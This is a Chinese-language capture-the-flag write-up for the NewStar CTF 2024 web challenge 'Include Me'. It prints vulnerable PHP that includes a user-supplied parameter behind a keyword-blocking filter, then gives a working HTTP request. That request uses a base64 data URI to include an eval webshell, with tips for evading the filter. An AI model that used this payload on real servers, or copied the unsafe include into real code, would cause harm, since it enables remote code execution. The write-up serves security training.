# Include Me

> 分类：Web

## 题目描述
打开题目 5s 后自动跳转搜索 PHP 伪协议，需用 GET 传入 `iknow` 防止跳转。题目源码：

```php
<?php
highlight_file(__FILE__);
function waf() {
    if(preg_match("/<|\?|php|>|echo|filter|flag|system|file|%|&|=|`|eval/i",$_GET['me'])){
        die("兄弟你别包");
    };
}
if (isset($_GET['phpinfo'])) {
    phpinfo();
}
if (!isset($_GET['iknow'])) {
    header("Refresh: 5;url=https://cn.bing.com/search?q=php%E4%BC%AA%E5%8D%8F%E8%AE%AE");
}
waf();
include $_GET['me'];
echo "兄弟你好香";
?>
```

## 考察知识点
- PHP 文件包含（伪协议）
- waf 绕过
- data 协议 + base64

## 解法
传 `phpinfo` 验证远程文件包含漏洞必要条件满足后，用 data 协议加 base64 绕过 waf：

```
GET /?iknow=1&me=data:text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWzBdKT8+%2B HTTP/1.1
```

`<?php @eval($_POST[0])?>` 的 Base64 为 `PD9waHAgQGV2YWwoJF9QT1NUWzBdKT8+`。

注意：
- Base64 结果不能带 `=`（会被 waf），可直接删掉结尾等号，或在明文后加空格使结果不带等号；
- 密文末尾若为 `+`，GET 传参需编码为 `%2B`。

## 参考答案
（未给出）

## 来源
- 作者：NewStar CTF 2024 官方 WriteUp | https://newstar.wiki/wp/2024/week3/web/include-me.html
